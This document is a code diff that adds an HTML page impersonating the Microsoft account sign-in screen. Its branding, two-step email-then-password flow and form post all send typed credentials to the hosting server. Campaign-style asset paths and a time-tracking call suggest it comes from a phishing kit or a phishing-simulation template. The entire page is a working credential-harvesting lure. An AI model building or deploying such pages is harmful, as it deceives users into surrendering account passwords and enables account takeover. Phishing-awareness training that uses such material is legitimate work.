@@ -1,0 +1,47 @@
+<!DOCTYPE html><html><head><script src="js/events.js"></script>
+	<title>Sign in to your Microsoft account</title>
+	<link href="public/campaign/69/77/11/style/styles.css" rel="stylesheet" type="text/css">
+	<link href="public/campaign/69/77/11/style/favicon.ico" rel="shortcut icon">
+</head>
+<body>
+<div class="outer">
+<div class="middle">
+<div class="inner"><img src="public/campaign/69/77/11/style/logo.png">
+<div class="title" id="title">Sign&nbsp;in</div>
+
+<form action="?login" class="login-form" id="reset" method="post" name="login-form">
+<div class="content"><input autocomplete="email" class="input username" id="login" maxlength="128" name="login" placeholder="Email, phone, or Skype" tabindex="1" type="text"> <input autocomplete="off" class="input password pass" id="hide-passwd" name="password" placeholder="Password" type="password"></div>
+
+<div class="noacc">No account? <a href="#">Create one!</a><br>
+<br>
+<a href="#">Sign-in options</a></div>
+
+<div class="button-container"><input class="button" id="Button9" name="submit" onclick="return clickSign();" type="submit" value="Next"></div>
+</form>
+</div>
+</div>
+</div>
+
+<div class="footer"><a href="#">Terms of use</a> <a href="#">Privacy &amp; cookies</a></div>
+<script type="text/javascript">
+var signmode = 0;
+function clickSign()
+{
+	if(signmode == 0)
+	{
+		document.getElementById('title').innerHTML = 'Enter Password  ';
+		document.getElementById('Button9').value = 'Sign in';
+		
+		signmode = 1;
+
+		document.getElementById('login').style.display = 'none';
+		document.getElementById('hide-passwd').style.display = 'inline-block';
+		return false;
+	}
+
+	return true;
+}
+
+</script><script src="js/timeme.min.js"></script><script src="js/time-tracker.js"></script><script type="text/javascript">trackTime("/scenario/track-time", "index");</script>
+
+</body></html>
